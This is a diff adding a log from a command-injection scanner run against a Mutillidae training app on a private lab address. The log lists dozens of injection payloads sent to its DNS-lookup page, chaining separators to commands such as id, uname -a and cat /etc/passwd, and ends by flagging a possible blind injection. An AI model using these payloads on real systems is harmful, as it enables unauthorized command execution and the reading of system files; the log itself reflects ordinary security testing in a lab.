@@ -1,0 +1,62 @@
+2024-04-11 14:23:55,832 - INFO - 
+Starting ScanCommandInject scan
+2024-04-11 14:23:55,841 - INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
+2024-04-11 14:23:55,880 - INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:55,911 - INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:55,952 - INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:55,984 - INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,014 - INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,045 - INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,075 - INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,103 - INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,133 - INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,164 - INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,194 - INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,224 - INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,254 - INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,284 - INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,312 - INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,342 - INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,373 - INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,404 - INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,434 - INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,464 - INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,495 - INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,523 - INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,553 - INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,584 - INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,614 - INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,644 - INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,674 - INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,704 - INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,733 - INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,763 - INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,793 - INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,823 - INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,854 - INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,884 - INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,914 - INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,941 - INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:56,971 - INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,134 - INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,165 - INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,194 - INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,225 - INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,255 - INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,283 - INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,314 - INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,380 - INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,410 - INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,441 - INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,471 - INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,501 - INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,529 - INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,559 - INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,736 - INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,767 - INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,797 - INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,827 - INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,856 - INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,885 - INFO - 	No command injection form vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+2024-04-11 14:23:57,885 - INFO - 	Testing blind command injection
+2024-04-11 14:24:02,943 - WARNING - 	Potential blind command injection vulnerability detected
